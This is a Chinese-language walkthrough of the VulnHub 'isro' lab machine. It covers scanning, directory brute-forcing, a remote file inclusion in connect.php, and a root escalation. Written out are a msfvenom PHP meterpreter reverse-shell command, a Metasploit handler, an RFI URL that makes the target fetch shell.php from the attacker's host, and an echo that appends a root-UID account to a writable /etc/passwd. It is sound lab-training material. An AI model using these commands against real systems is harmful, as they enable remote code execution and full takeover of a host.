# vulnhub之isro的实践

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzA3MjM5MDc2Nw==&mid=2650745971&idx=1&sn=abd3acefa221f3e5306685c86ac546a0&chksm=87148d73b06304659c0c9d42c60d9e7343e7f32bb2984fd636baa4ed8eb808dc041338244660&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzA3MjM5MDc2Nw==&mid=2650745971&idx=1&sn=abd3acefa221f3e5306685c86ac546a0&chksm=87148d73b06304659c0c9d42c60d9e7343e7f32bb2984fd636baa4ed8eb808dc041338244660&scene=27#wechat_redirect)

本周实践的是vulnhub的isro镜像，下载地址，https://download.vulnhub.com/ha/isro.zip，

首先做地址扫描，sudo netdiscover -r 192.168.137.0/24，

![](../Images/ad5af871d6c975c190752d1ab8109ce1.png)

接着做端口扫描，sudo nmap -sS -sV -T4 -A -p- 192.168.137.80，

![](../Images/e5e9aaddc7a772ac667c3b9347de3eee.png)

再来个目录文件爆破，sudo dirb http://192.168.137.80 -X .php,.txt,.zip,.html，

![](../Images/6fc3a2550a74da816955d756ce4870d0.png)

这个地方直接猜测http://192.168.137.80/connect.php有文件包含漏洞，一试还真有，案理说不该这么直接猜的，应该拿web漏洞扫描器扫出来，

![](../Images/b72923a5f0106bc0f9dbe3d8bda15d1e.png)

不管这么多了，总之就是要利用这个漏洞，

在kali攻击机上做一个反弹shell脚本，

msfvenom -p php/meterpreter/reverse\_tcp LHOST=192.168.137.194 LPORT=4444 R > shell.php，

在kali攻击机上开启web文件下载服务，python -m SimpleHTTPServer，

在kali攻击机上开一个meterpretershell监听，

msfconsole  
use exploit/multi/handler  
set payload php/meterpreter/reverse\_tcp  
set LHOST 192.168.137.194  
exploit

这就可以通过访问http://192.168.137.80/connect.php?file=http://192.168.137.194:8000/shell.php来制造反弹shell，

拿到meterpreter反弹shell后getuid查看，不是root，还需要继续提权，  

![](../Images/e197961d0dd56ed706f26fa75f8717ec.png)

先转成交互式的shell，

shell，python3 -c 'import pty;pty.spawn("/bin/bash")'，

查看/etc/passwd，ls -la /etc/passwd，发现当前账户可写，

那就有招了，可以制作一个账户密码填进去，hacker/password，

制作密码，perl -le 'print crypt("password","salt")'，

填到/etc/passwd里，echo "hacker:sa3tHJ3/KuYvI:0:0:hacker:/root:/bin/bash" >> /etc/passwd，

再切换账户，su hacker，再id查看，获取root权限完成，
